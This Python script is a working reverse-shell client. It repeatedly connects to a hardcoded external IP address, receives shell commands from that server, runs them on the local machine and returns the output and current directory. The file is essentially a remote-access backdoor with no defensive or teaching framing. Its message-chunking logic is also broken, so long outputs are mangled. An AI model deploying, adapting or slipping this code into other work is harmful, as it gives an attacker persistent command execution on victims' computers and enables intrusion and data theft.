import socket
import time
import os
import subprocess

HEADER = 1024
PORT = 87
# SERVER = "127.0.0.1"
SERVER = "46.101.213.187"
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"
ADDR = (SERVER, PORT)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def send(msg):
    more = False
    msg_encoded = msg.encode(FORMAT)
    if len(msg_encoded) > 1000:
        msg_encoded = msg_encoded[1000:]
        more = True
    msg_len = len(msg_encoded)
    msg_len_encoded = str(msg_len).encode(FORMAT)
    msg_len_encoded += b" " * (HEADER - len(str(msg_len)))
    print(len(msg_len_encoded))
    print(msg_len_encoded.decode())
    client.send(msg_len_encoded)
    client.send(msg_encoded)
    if more: send(msg_encoded[1001:].decode(FORMAT))


def receive(conn):
    try:
        msg_len = conn.recv(HEADER).decode(FORMAT)
    except:
        raise socket.timeout()
    if not msg_len: raise socket.timeout()
    msg_len = int(msg_len)
    msg = conn.recv(msg_len).decode(FORMAT)
    return msg


def is_still_connected():
    try:
        send("")
    except:
        return False
    return True


def connect(addr):
    global client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect(ADDR)
        return True
    except:
        time.sleep(10)
        return False


def main():
    global client
    while True:
        while True:
            if connect(ADDR): break
        client.settimeout(5)
        while True:
            command = ""
            output = ""
            try:
                command = receive(client).lower()
            except socket.timeout:
                if not is_still_connected():
                    break
                else:
                    continue
            if command == "":
                continue
            elif command == "disconnect":
                continue
            split_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            elif command.lower().strip() == "cd":
                send(os.getcwd())
                continue
            elif split_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(split_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            elif command == "exit":
                send(DISCONNECT_MESSAGE)
                exit()
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            send(output)
            send(cwd)
        if command == "exit":
            break
    send(DISCONNECT_MESSAGE)
    client.close()


if __name__ == "__main__":
    main()
